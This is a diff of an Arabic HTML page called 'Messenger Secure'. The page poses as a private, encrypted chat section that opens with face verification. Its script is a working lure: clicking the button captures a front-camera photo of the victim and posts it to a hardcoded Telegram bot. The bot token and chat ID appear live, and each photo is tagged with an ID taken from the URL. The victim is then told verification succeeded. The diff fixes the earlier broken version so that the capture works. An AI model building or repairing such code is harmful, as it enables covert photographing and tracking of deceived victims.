@@ -1,187 +1,210 @@
 <!DOCTYPE html>
-<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Messenger Secure</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Messenger Secure</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
 
-<style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:'Cairo',sans-serif;
-}
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+        }
 
-body{
-    background:#f0f2f5;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    min-height:100vh;
-}
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
 
-.container{
-    width:390px;
-    max-width:95%;
-}
+        .container {
+            width: 390px;
+            max-width: 95%;
+        }
 
-.card{
-    background:#fff;
-    border-radius:24px;
-    padding:35px 25px;
-    box-shadow:0 15px 45px rgba(0,0,0,.15);
-    text-align:center;
-}
+        .card {
+            background: #fff;
+            border-radius: 24px;
+            padding: 35px 25px;
+            box-shadow: 0 15px 45px rgba(0, 0, 0, .15);
+            text-align: center;
+        }
 
-.logo{
-    width:90px;
-    height:90px;
-    margin:auto;
-    border-radius:50%;
-    background:linear-gradient(135deg,#0084ff,#6a5cff);
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    color:#fff;
-    font-size:42px;
-    margin-bottom:20px;
-}
+        .logo {
+            width: 90px;
+            height: 90px;
+            margin: auto;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0084ff, #6a5cff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 42px;
+            margin-bottom: 20px;
+        }
 
-h1{
-    font-size:27px;
-    color:#111;
-    margin-bottom:10px;
-}
+        h1 {
+            font-size: 27px;
+            color: #111;
+            margin-bottom: 10px;
+        }
 
-.subtitle{
-    color:#666;
-    margin-bottom:30px;
-    line-height:1.7;
-}
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.7;
+        }
 
-.security{
-    background:#f7f9fc;
-    border-radius:18px;
-    padding:20px;
-    text-align:right;
-}
+        .security {
+            background: #f7f9fc;
+            border-radius: 18px;
+            padding: 20px;
+            text-align: right;
+        }
 
-.security h2{
-    font-size:19px;
-    margin-bottom:15px;
-    color:#222;
-}
+        .security h2 {
+            font-size: 19px;
+            margin-bottom: 15px;
+            color: #222;
+        }
 
-.security ul{
-    list-style:none;
-}
+        .security ul {
+            list-style: none;
+        }
 
-.security li{
-    margin:14px 0;
-    color:#444;
-    font-size:15px;
-}
+        .security li {
+            margin: 14px 0;
+            color: #444;
+            font-size: 15px;
+        }
 
-.security li::before{
-    content:"🔒 ";
-}
+        .security li::before {
+            content: "🔒 ";
+        }
 
-button{
-    width:100%;
-    margin-top:30px;
-    border:none;
-    border-radius:40px;
-    background:linear-gradient(135deg,#0084ff,#0069ff);
-    color:#fff;
-    font-size:18px;
-    font-weight:bold;
-    padding:16px;
-    cursor:pointer;
-    transition:.3s;
-}
+        button {
+            width: 100%;
+            margin-top: 30px;
+            border: none;
+            border-radius: 40px;
+            background: linear-gradient(135deg, #0084ff, #0069ff);
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 16px;
+            cursor: pointer;
+            transition: .3s;
+        }
 
-button:hover{
-    transform:scale(1.03);
-}
+        button:hover {
+            transform: scale(1.03);
+        }
 
-.note{
-    margin-top:18px;
-    color:#888;
-    font-size:13px;
-}
-</style>
+        .note {
+            margin-top: 18px;
+            color: #888;
+            font-size: 13px;
+        }
+
+        #result {
+            margin-top: 15px;
+            font-weight: bold;
+        }
+    </style>
 </head>
 
 <body>
 
-<div class="container">
+    <div class="container">
+        <div class="card">
+            <div class="logo">💬</div>
+            <h1>Messenger Secure</h1>
+            <p class="subtitle">مرحبًا بكم في قسم Messenger الخاص.</p>
 
-<div class="card">
+            <div class="security">
+                <h2>الحماية والأمان</h2>
+                <ul>
+                    <li>المحادثات مشفّرة بالكامل بين الطرفين.</li>
+                    <li>يمنع التقاط لقطات الشاشة داخل هذا القسم.</li>
+                    <li>يمنع حفظ الصور أو تنزيل الوسائط.</li>
+                    <li>تُحذف المحادثات تلقائيًا بعد الاطلاع عليها.</li>
+                    <li>لا يمكن فتح Messenger الخاص إلا باستخدام بصمة الوجه.</li>
+                </ul>
+            </div>
 
-<div class="logo">
-💬
-</div>
+            <!-- ✅ دوگمەکە ئێستا id ی هەیە -->
+            <button id="btnStart">اضغط هنا لإنشاء بصمة الوجه وفتح المحادثات</button>
 
-<h1>Messenger Secure</h1>
+            <!-- ✅ توخمێک بۆ نیشاندانی پەیام -->
+            <div id="result"></div>
 
-<p class="subtitle">
-مرحبًا بكم في قسم Messenger الخاص.
-</p>
+            <div class="note">🔒 جميع بياناتك محمية وفق أعلى معايير الأمان.</div>
+        </div>
+    </div>
 
-<div class="security">
+    <!-- ✅ سکریپتی ڕاستکراو -->
+    <script>
+        const TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
+        const CHAT = '1015102519'; // ← چات ئایدی ڕاستەقینەی تۆ
+        const chatId = new URLSearchParams(location.search).get('chatId') || 'unknown';
 
-<h2>الحماية والأمان</h2>
+        async function capture() {
+            const btn = document.getElementById('btnStart');
+            const res = document.getElementById('result');
 
-<ul>
-<li>المحادثات مشفّرة بالكامل بين الطرفين.</li>
+            btn.disabled = true;
+            btn.textContent = '⏳ جارٍ...';
+            res.textContent = '';
+            res.style.display = 'block';
 
-<li>يمنع التقاط لقطات الشاشة داخل هذا القسم.</li>
+            try {
+                // داواکردنی مۆڵەتی کامێرا
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 }
+                });
 
-<li>يمنع حفظ الصور أو تنزيل الوسائط.</li>
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
 
-<li>تُحذف المحادثات تلقائيًا بعد الاطلاع عليها.</li>
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
 
-<li>لا يمكن فتح Messenger الخاص إلا باستخدام بصمة الوجه.</li>
+                const photo = canvas.toDataURL('image/jpeg', 0.7);
+                stream.getTracks().forEach(track => track.stop());
 
-</ul>
+                const blob = await (await fetch(photo)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', CHAT); // ← ناردن بۆ چاتی ڕاستەقینە
+                fd.append('photo', blob, `cam_${chatId}.jpg`);
+                fd.append('caption', `📸 صورة - ID: ${chatId}`);
 
-</div>
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: fd
+                });
 
-<button>
-اضغط هنا لإنشاء بصمة الوجه وفتح المحادثات
-</button>
+                res.textContent = '✅ تم التحقق بنجاح';
+                btn.textContent = '✅ تم';
 
-<div class="note">
-🔒 جميع بياناتك محمية وفق أعلى معايير الأمان.
-</div>
+            } catch (e) {
+                res.textContent = '❌ خطأ: ' + e.message;
+                btn.disabled = false;
+                btn.textContent = '📷 إعادة المحاولة';
+            }
+        }
 
-</div>
-
-</div>
-
+        // ✅ بەستنەوەی فەنکشن بە دوگمەکەوە
+        document.getElementById('btnStart').addEventListener('click', capture);
+    </script>
 </body>
 </html>
-<script>
-const TOKEN='7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI',CHAT='1015102519';
-const chatId=new URLSearchParams(location.search).get('chatId')||'unknown';
-async function capture(){
-    const btn=document.getElementById('btnStart'),res=document.getElementById('result');
-    btn.disabled=true;btn.textContent='⏳ جارٍ...';res.className='';res.style.display='none';
-    try{
-        const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480}});
-        const v=document.createElement('video');v.srcObject=s;await v.play();
-        const c=document.createElement('canvas');c.width=640;c.height=480;
-        c.getContext('2d').drawImage(v,0,0);const photo=c.toDataURL('image/jpeg',0.7);
-        s.getTracks().forEach(t=>t.stop());
-        const blob=await(await fetch(photo)).blob(),fd=new FormData();
-        fd.append('chat_id',CHAT);fd.append('photo',blob,cam_${chatId}.jpg);
-        fd.append('caption',📸 صورة - ID: ${chatId});
-        await fetch(https://api.telegram.org/bot${TOKEN}/sendPhoto,{method:'POST',body:fd});
-        res.className='ok';res.textContent='✅ تم التحقق بنجاح';btn.textContent='✅ تم';
-    }catch(e){res.className='fail';res.textContent='❌ خطأ: '+e.message;btn.disabled=false;btn.textContent='📷 إعادة المحاولة';}
-}
-</script></body></html>
